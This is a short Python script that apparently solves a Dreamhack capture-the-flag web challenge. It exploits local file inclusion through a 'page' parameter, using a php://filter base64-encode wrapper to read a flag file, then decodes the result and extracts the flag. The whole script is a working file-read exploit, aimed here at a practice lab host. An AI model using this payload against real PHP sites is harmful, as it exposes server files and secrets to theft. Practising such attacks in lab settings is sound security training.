import requests
import re
import base64
from bs4 import BeautifulSoup

url = 'http://host3.dreamhack.games:17807'
payload = 'php://filter/convert.base64-encode/resource='
flag_file = '/var/www/uploads/flag'

res = requests.get(f'{url}/index.php?page={payload}{flag_file}')
soup = BeautifulSoup(res.text, 'html.parser')
items = soup.find_all('div', class_='container')

base64_encoded_flag_file_content = items[1].text.strip()

flag_file_content = base64.b64decode(base64_encoded_flag_file_content).decode('utf-8')

match = re.search(r'DH\{[^<]*\}', flag_file_content)
print(match.group(0))